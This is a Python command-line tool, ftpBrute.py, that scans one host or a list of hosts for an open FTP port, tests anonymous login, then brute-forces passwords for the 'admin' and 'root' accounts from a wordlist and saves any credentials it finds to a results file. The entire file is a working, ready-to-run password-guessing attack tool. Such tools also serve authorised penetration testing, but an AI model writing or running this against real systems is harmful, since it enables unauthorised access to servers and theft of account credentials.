#!/usr/bin python

# -*- coding:utf-8 -*-


import argparse
import sys
import socket
from ftplib import FTP

info = '''
Usage: ./ftpBrute.py [options]\n
Options: -t, --target    <hostname/ip>   |   Target
	 -tfile, --targetfile <filename> |   target list
	 -w, --wordlist  <filename>      |   Wordlist
	 -h, --help      <help>          |   print help
Example: ./ftpBrute.py -t 192.168.1.1 -w wordlist.txt
'''

def help():
	print(info)
	sys.exit(0)

def check_server(address, port):
	s = socket.socket()
	s.settimeout(5)

	print('Attempting to connect to '+ address + ' on port '+ str(port))
	try:
		s.connect((address, port))
		#print "Connected to %s on port %s" % (address, port)
		return True

	except socket.error as e:
		print('Connection to ' + address + ' on port '+ str(port) + ' failed: '+ str(e))
		return False
	finally:
		s.close()

def check_anonymous_login(target):
	print('Testing Anonymous login for: ' + target)
	try:
		ftp = FTP(target, timeout=5)
		status = ftp.login()
		print('[+] Anonymous login is open on '+ target)
		print('[+] Username : anonymous')
		print('[+] Password : anonymous')
		ftp.quit()
		with open('./results/ftpBrute.md', 'a') as f:
			f.write('- '+target+" -> anonymous:anonymous \r\n")
		return status
	except:
		pass

def ftp_login(target, username, password):
	try:
		ftp = FTP(target, timeout=5)
		print('Tryin to Brute ' + target + ' -> ' + username +':'+ password)
		ftp.login(username, password)
		ftp.quit()
		print("\n[!] Credentials found for " + target)
		print("[!] Username : {}".format(username))
		print("[!] Password : {}".format(password))

		with open('./results/ftpBrute.md', 'a') as f:
			f.write('- '+target+" -> "+ username + ':' + password + "\r\n")

		return 1
	except:
		pass

def brute_force(target, username, wordlist):
	try:
		wordlist = open(wordlist, "r")
		words = wordlist.readlines()
		for word in words:
			word = word.strip()
			check = ftp_login(target, username, word)
			if check == 1:
				return

	except:
		print("\n[-] There is no such wordlist file.")
		sys.exit(0)

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", "--target")
	parser.add_argument("-w", "--wordlist")
	parser.add_argument("-tfile", "--targetfile")

	args = parser.parse_args()


	if not args.target and not args.targetfile or not args.wordlist:
		help()
		sys.exit(0)

	target = args.target
	targetfile = args.targetfile
	wordlist = args.wordlist
	usernameList = ['admin', 'root']

	if targetfile is not None:
		newTargetList= []
		try:
			with open(targetfile) as data:
				targetsList = data.read().splitlines()

			for host in targetsList:
				portOpen = check_server(host, 21)

				if portOpen is True:
					anonymousCheck = check_anonymous_login(host)
					if anonymousCheck is None:
						newTargetList.append(host)

			for user in usernameList:
				for host in newTargetList:
					brute_force(host, user, wordlist)

		except Exception as e:
			print('brute: ', e)
			sys.exit(1)

	else:
		portOpen = check_server(target, 21)
		if portOpen is False:
			print('port is closed')
			sys.exit(0)
		else:
			anonymousCheck = check_anonymous_login(target)

			if anonymousCheck is not None:
				sys.exit(0)

			for user in usernameList:
				brute_force(target, user, wordlist)

if __name__ == '__main__':

	try:
		main()
		print("\n[-] Brute force finished.")

	except KeyboardInterrupt:
		print("\n[!] Keyboard Interruption detected")
		exit(1)

	except Exception as e:
		print ('main :', e)
